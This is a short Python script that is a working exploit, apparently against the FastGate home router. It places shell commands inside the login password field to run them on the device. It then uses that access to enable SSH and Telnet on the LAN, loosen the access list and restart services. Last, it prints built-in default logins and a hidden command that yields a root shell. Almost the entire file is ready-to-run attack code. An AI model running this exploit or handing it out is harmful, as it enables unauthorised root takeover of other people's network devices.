from __future__ import print_function

import time

from fastgate.http_client import FastGateHTTPClient


class PasswdFieldExploit(FastGateHTTPClient):

    def shell(self, cmd):
        cmd = "'; {} ; #".format(cmd)
        return self.login("culo", cmd)

    def get_root(self):
        print("Enabling SSH and Telnet daemons on local network")
        self.shell("/usr/sbin/stnvram set CWMPX_FASTWEB_AppCfgSshdAllowIF LAN ; /usr/sbin/stnvram commit")
        time.sleep(1)
        print("Granting access to SSH and Telnet from local network")
        self.shell("/usr/sbin/stnvram set CWMPX_FASTWEB_AppCfgTelnet_SSH_ACL 192.168.1.0/16 ; /usr/sbin/stnvram commit")
        time.sleep(1)
        print("Restarting SSH daemon")
        self.shell(
            "PATH='/home/bin:/home/scripts:/opt/bin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/jamvm/bin:/opt/scripts' "
            "/usr/sbin/rc_task sshd restart")
        time.sleep(2)
        print("Restarting Telnet daemon")
        self.shell(
            "PATH='/home/bin:/home/scripts:/opt/bin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/jamvm/bin:/opt/scripts' "
            "/usr/sbin/rc_task telnet restart")
        time.sleep(2)
        print("Restarting firewall")
        self.shell(
            "PATH='/home/bin:/home/scripts:/opt/bin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/jamvm/bin:/opt/scripts' "
            "/usr/sbin/rc_task firewall restart")

        print("You should now be able to ssh/telnet {host}".format(host=self.host))
        print("ssh lanadmin@{host} (password: 'lanpasswd')".format(host=self.host))
        print()
        print("Once you get to the st_shell, execute the 'sh' hidden command to get a root shell.")
        print("Try following the following login information:")
        print("User: lanadmin\tPasswd: lanpasswd")
        print("User: FASTGate\tPasswd: Testplant123")
